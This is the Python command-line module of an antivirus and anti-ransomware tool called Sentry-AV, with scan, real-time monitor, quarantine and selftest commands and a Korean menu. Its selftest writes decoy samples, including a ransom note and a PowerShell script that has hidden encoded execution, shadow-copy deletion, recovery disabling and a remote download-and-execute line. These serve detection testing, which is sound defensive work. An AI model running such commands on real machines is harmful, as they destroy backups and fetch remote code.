"""Command-line interface."""
from __future__ import annotations

import argparse
import json
import sys
from pathlib import Path

from rich.progress import BarColumn, Progress, SpinnerColumn, TextColumn, TimeElapsedColumn

from . import __version__
from .config import load_config
from .elevation import ensure_admin, is_admin
from .utils import IS_WINDOWS
from .report import console, print_findings, write_json
from .utils import app_dir, setup_logging

NEEDS_ADMIN = {"scan", "monitor", "service"}


def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(prog="sentry", description="Sentry-AV: Windows/macOS antivirus + anti-ransomware")
    p.add_argument("--version", action="version", version=f"sentry-av {__version__}")
    p.add_argument("-v", "--verbose", action="store_true")
    p.add_argument("--no-elevate", action="store_true", help="do not try to gain admin/root")
    p.add_argument("--sudo", action="store_true",
                   help="macOS/Linux only: ask for root via sudo (password). Default is to run as the current user")
    p.add_argument("--config", type=Path, help="alternate config.json")
    sub = p.add_subparsers(dest="cmd", required=True)

    s = sub.add_parser("scan", help="scan files/folders for malware and ransomware artifacts")
    s.add_argument("paths", nargs="*", help="files or directories (default: quick-scan set)")
    s.add_argument("--full", action="store_true", help="scan whole system drive(s)")
    s.add_argument("--json", type=Path, help="write JSON report")
    s.add_argument("--quarantine", action="store_true", help="quarantine high/critical findings")
    s.add_argument("--min-severity", default="low", choices=["low", "medium", "high", "critical"])
    s.add_argument("--show-low", action="store_true", help="also list low-severity findings in the table")
    s.add_argument("--threads", type=int)

    m = sub.add_parser("monitor", help="real-time protection: watch, detect and kill ransomware")
    m.add_argument("paths", nargs="*", help="directories to watch (default: user folders)")
    m.add_argument("--aggressive", action="store_true", help="kill medium-confidence suspects too")
    m.add_argument("--no-canary", action="store_true", help="do not place decoy files")
    m.add_argument("--dry-run", action="store_true", help="detect and log, never kill")

    q = sub.add_parser("quarantine", help="manage quarantined files")
    qs = q.add_subparsers(dest="qcmd", required=True)
    qs.add_parser("list")
    r = qs.add_parser("restore"); r.add_argument("id"); r.add_argument("--to")
    d = qs.add_parser("delete"); d.add_argument("id")
    qs.add_parser("purge")

    sub.add_parser("update", help="download hash signatures from configured feeds")

    w = sub.add_parser("whitelist", help="trusted processes / paths")
    ws = w.add_subparsers(dest="wcmd", required=True)
    ws.add_parser("list")
    wa = ws.add_parser("add"); wa.add_argument("value", help="process name (foo.exe) or path prefix")
    wr = ws.add_parser("remove"); wr.add_argument("value")

    sv = sub.add_parser("service", help="install real-time monitor as a boot/logon service")
    sv.add_argument("action", choices=["install", "uninstall", "status"])

    sub.add_parser("status", help="show configuration, signature counts and incidents")
    st = sub.add_parser("selftest", help="create harmless test samples and scan them")
    st.add_argument("--keep", action="store_true")
    return p


_MENU = [
    ("빠른 검사 (사용자 폴더·임시 폴더)", ["scan"]),
    ("전체 디스크 검사", ["scan", "--full"]),
    ("실시간 보호 시작 (랜섬웨어 차단, Ctrl+C 로 종료)", ["monitor"]),
    ("실시간 보호를 부팅 시 자동 실행으로 등록", ["service", "install"]),
    ("자동 실행 해제", ["service", "uninstall"]),
    ("격리된 파일 목록", ["quarantine", "list"]),
    ("상태 / 설정 보기", ["status"]),
    ("자가 진단 (무해한 테스트 샘플 검사)", ["selftest"]),
]


def interactive_menu() -> list[str] | None:
    """Shown when launched without arguments (e.g. double-clicked). Returns argv or None to quit."""
    console.print(f"[bold]Sentry-AV {__version__}[/]  Windows/macOS 백신 + 랜섬웨어 차단\n")
    for i, (label, _) in enumerate(_MENU, 1):
        console.print(f"  [cyan]{i}[/]. {label}")
    console.print("  [cyan]0[/]. 종료\n")
    while True:
        try:
            choice = input("번호를 입력하세요: ").strip()
        except (EOFError, KeyboardInterrupt):
            return None
        if choice in ("0", "q", ""):
            return None
        if choice.isdigit() and 1 <= int(choice) <= len(_MENU):
            return list(_MENU[int(choice) - 1][1])
        console.print("[yellow]잘못된 번호입니다.[/]")


def _pause_if_double_clicked() -> None:
    """Keep the terminal window open when we were started from Finder/Explorer."""
    try:
        if sys.stdin.isatty():
            input("\n엔터를 누르면 창이 닫힙니다...")
    except (EOFError, KeyboardInterrupt):
        pass


def _only_global_opts(argv: list[str]) -> bool:
    """True when no sub-command was given (only -v / --no-elevate / --sudo / --config X, or nothing)."""
    i = 0
    while i < len(argv):
        a = argv[i]
        if a in ("-v", "--verbose", "--no-elevate", "--sudo"):
            i += 1
        elif a == "--config" and i + 1 < len(argv):
            i += 2
        else:
            return False
    return True


def main(argv: list[str] | None = None) -> int:
    argv = sys.argv[1:] if argv is None else argv
    if _only_global_opts(argv):
        if not sys.stdin.isatty():
            build_parser().print_help()
            return 2
        chosen = interactive_menu()
        if chosen is None:
            return 0
        rc = main([*argv, *chosen])
        _pause_if_double_clicked()
        return rc
    args = build_parser().parse_args(argv)
    setup_logging(args.verbose, app_dir() / "sentry.log")
    cfg = load_config(args.config)

    if args.cmd in NEEDS_ADMIN and not args.no_elevate and not is_admin():
        ensure_admin(argv, use_sudo=args.sudo)

    if not is_admin() and args.cmd in NEEDS_ADMIN:
        msg = "사용자 권한 모드: 내 계정의 프로세스와 파일은 보호되지만, 다른 사용자/시스템 프로세스는 제어할 수 없습니다."
        if not IS_WINDOWS:
            msg += " (루트가 필요하면 --sudo)"
        console.print(f"[yellow]{msg}[/]")

    return {
        "scan": cmd_scan, "monitor": cmd_monitor, "quarantine": cmd_quarantine, "update": cmd_update,
        "whitelist": cmd_whitelist, "service": cmd_service, "status": cmd_status, "selftest": cmd_selftest,
    }[args.cmd](args, cfg)


# ---------------------------------------------------------------------------
def cmd_scan(args, cfg) -> int:
    from .quarantine import Quarantine
    from .scanner import Scanner
    from .utils import IS_WINDOWS
    from .whitelist import Whitelist

    if args.threads:
        cfg.set("scan_threads", args.threads)
    if args.full:
        roots = ["C:\\"] if IS_WINDOWS else ["/"]
        if IS_WINDOWS:
            import string, os
            roots = [f"{d}:\\" for d in string.ascii_uppercase if os.path.exists(f"{d}:\\")]
    else:
        roots = args.paths or cfg.quick_scan_paths
    scanner = Scanner(cfg, Whitelist(cfg))
    console.print(f"[bold]Sentry-AV[/] scanning {len(roots)} root(s) with {scanner.threads} threads "
                  f"(hashes={scanner.sigdb.stats()['hashes']}, yara={'on' if scanner.yara.available else 'off'})")
    with Progress(SpinnerColumn(), TextColumn("{task.description}"), BarColumn(bar_width=None),
                  TextColumn("{task.completed} files"), TimeElapsedColumn(), console=console, transient=True) as prog:
        task = prog.add_task("scanning", total=None)

        def on_progress(path, stats):
            short = path if len(path) < 70 else "…" + path[-69:]
            prog.update(task, completed=stats.files_scanned, description=short)

        try:
            findings, stats = scanner.scan_paths(roots, on_progress, min_severity=args.min_severity)
        except KeyboardInterrupt:
            scanner.stop()
            console.print("[yellow]interrupted[/]")
            return 130
    print_findings(findings, stats, roots, show_low=args.show_low, suppressed=scanner.suppressed_signed)
    report_path = args.json
    if report_path is None:
        import time as _time
        rdir = app_dir() / "reports"
        rdir.mkdir(parents=True, exist_ok=True)
        report_path = rdir / f"scan-{_time.strftime('%Y%m%d-%H%M%S')}.json"
    write_json(findings, stats, roots, report_path)
    console.print(f"JSON report: {report_path}")
    if args.quarantine:
        q = Quarantine()
        n = 0
        for f in findings:
            if f.severity in ("high", "critical"):
                if q.add(f.path, f"{f.category}: {'; '.join(f.reasons)[:200]}", f.sha256):
                    n += 1
        console.print(f"quarantined {n} file(s) -> {q.dir}")
    return 2 if any(f.severity in ("high", "critical") for f in findings) else 0


def cmd_monitor(args, cfg) -> int:
    from .realtime import RealtimeMonitor
    mon = RealtimeMonitor(cfg, paths=args.paths or None, canary=not args.no_canary,
                          dry_run=args.dry_run, aggressive=args.aggressive or None)
    console.print(f"[bold green]Sentry-AV real-time protection[/]  watching: {', '.join(mon.paths)}")
    console.print(f"canaries={'on' if mon.canary_enabled else 'off'}  aggressive={cfg.get('aggressive')}  "
                  f"dry_run={args.dry_run}  incidents -> {mon.responder.incident_log}   (Ctrl+C to stop)")
    mon.run_forever()
    return 0


def cmd_quarantine(args, cfg) -> int:
    from .quarantine import Quarantine
    from rich.table import Table
    q = Quarantine()
    if args.qcmd == "list":
        rows = q.list()
        if not rows:
            console.print("quarantine is empty")
            return 0
        t = Table()
        for c in ("id", "time", "original_path", "reason"):
            t.add_column(c, overflow="fold")
        for r in rows:
            t.add_row(r["id"], r["time"], r["original_path"], r["reason"])
        console.print(t)
    elif args.qcmd == "restore":
        console.print(f"restored to {q.restore(args.id, args.to)}")
    elif args.qcmd == "delete":
        q.delete(args.id); console.print("deleted")
    elif args.qcmd == "purge":
        console.print(f"purged {q.purge()} item(s)")
    return 0


def cmd_update(args, cfg) -> int:
    from .updater import update_signatures
    res = update_signatures(cfg.signature_urls)
    console.print_json(json.dumps(res, ensure_ascii=False))
    return 0 if res["added"] or all("ok" in v for v in res["feeds"].values()) else 1


def cmd_whitelist(args, cfg) -> int:
    from .whitelist import Whitelist
    if args.wcmd == "list":
        console.print_json(json.dumps(Whitelist(cfg).describe(), ensure_ascii=False))
        return 0
    key = "whitelist_path_prefixes" if ("/" in args.value or "\\" in args.value) else "whitelist_process_names"
    lst = list(cfg.get(key, []))
    if args.wcmd == "add" and args.value not in lst:
        lst.append(args.value)
    elif args.wcmd == "remove" and args.value in lst:
        lst.remove(args.value)
    cfg.set(key, lst)
    cfg.save()
    console.print(f"{key} = {lst}")
    return 0


def cmd_service(args, cfg) -> int:
    from . import service
    try:
        if args.action == "install":
            cfg.save()  # persist resolved absolute paths for the daemon
            console.print(service.install())
        elif args.action == "uninstall":
            console.print(service.uninstall())
        else:
            console.print(service.status())
    except RuntimeError as e:
        console.print(f"[red]{e}[/]")
        return 1
    return 0


def cmd_status(args, cfg) -> int:
    from .scanner.signatures import SignatureDB
    from .scanner.yara_engine import YaraEngine
    from .quarantine import Quarantine
    from . import service
    inc = app_dir() / "incidents.jsonl"
    n_inc = sum(1 for _ in open(inc, encoding="utf-8")) if inc.exists() else 0
    info = {
        "version": __version__, "admin": is_admin(), "config": str(cfg.path), "app_dir": str(app_dir()),
        "signatures": SignatureDB().stats(), "yara": YaraEngine().available,
        "quarantine_items": len(Quarantine().list()), "incidents": n_inc, "service": service.status(),
        "monitor_paths": cfg.monitor_paths, "quick_scan_paths": cfg.quick_scan_paths,
    }
    console.print_json(json.dumps(info, ensure_ascii=False))
    return 0


def cmd_selftest(args, cfg) -> int:
    """Create harmless samples that *look* like threats and scan them."""
    import os, tempfile
    from .scanner import Scanner
    from .whitelist import Whitelist
    d = Path(tempfile.mkdtemp(prefix="sentry-selftest-"))
    eicar = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
    (d / "eicar.com").write_text(eicar)
    (d / "HOW_TO_DECRYPT_FILES.txt").write_text(
        "All your files have been encrypted! To decrypt your files you must buy our decryption key with bitcoin. "
        "Contact us via tor browser at xxxx.onion within 72 hours.")
    (d / "photo.jpg.locked").write_bytes(os.urandom(4096))
    (d / "report.pdf").write_bytes(os.urandom(4096))
    (d / "setup.ps1").write_text(
        "powershell -nop -w hidden -enc " + "A" * 60 + "\nvssadmin delete shadows /all /quiet\n"
        "bcdedit /set {default} recoveryenabled no\nIEX (New-Object Net.WebClient).DownloadString('http://x/y')")
    (d / "clean.txt").write_text("hello world\n" * 50)
    findings, stats = Scanner(cfg, Whitelist(cfg)).scan_paths([str(d)])
    print_findings(findings, stats, [str(d)])
    expected = {"eicar.com", "HOW_TO_DECRYPT_FILES.txt", "photo.jpg.locked", "report.pdf", "setup.ps1"}
    got = {Path(f.path).name for f in findings}
    ok = expected <= got and "clean.txt" not in got
    console.print("[bold green]SELFTEST PASSED[/]" if ok else f"[bold red]SELFTEST FAILED[/] missing={expected - got} extra={got - expected}")
    if not args.keep:
        import shutil
        shutil.rmtree(d, ignore_errors=True)
    return 0 if ok else 1
